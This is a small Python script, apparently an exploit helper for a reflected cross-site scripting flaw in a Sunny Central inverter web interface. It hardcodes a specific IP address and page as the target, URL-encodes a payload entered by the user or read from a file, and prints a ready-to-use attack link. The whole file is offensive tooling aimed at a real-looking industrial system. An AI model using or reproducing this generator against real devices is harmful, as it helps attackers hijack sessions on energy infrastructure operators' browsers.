import argparse
from urllib.parse import quote

def urlgen(payload):
    uurr = "http://62.74.150.39:8082/bottom.htm"

    print("Target:", uurr)

    if payload:
        encodono = quote(payload)
    else:
        payload = input("Payload: ")
        if not payload:
            print("No payload provided.")
            return
        encodono = quote(payload)

    urldone = f"{uurr}{encodono}"

    print("\nURL:", urldone)

def main():
    parser = argparse.ArgumentParser(description="URL Generator for Sunny-Central-RXSS.")
    parser.add_argument('--file', action='store_true', help="Prompts for the payload file.")

    args = parser.parse_args()

    if args.file:
        payfile = input("Payload file: ")
        try:
            with open(payfile, 'r') as file:
                payload = file.read().strip()
                print(f"Payload: {payload}")
                urlgen(payload)
        except FileNotFoundError:
            print(f"{payfile} not found.")
    else:
        urlgen(None)

if __name__ == "__main__":
    main()
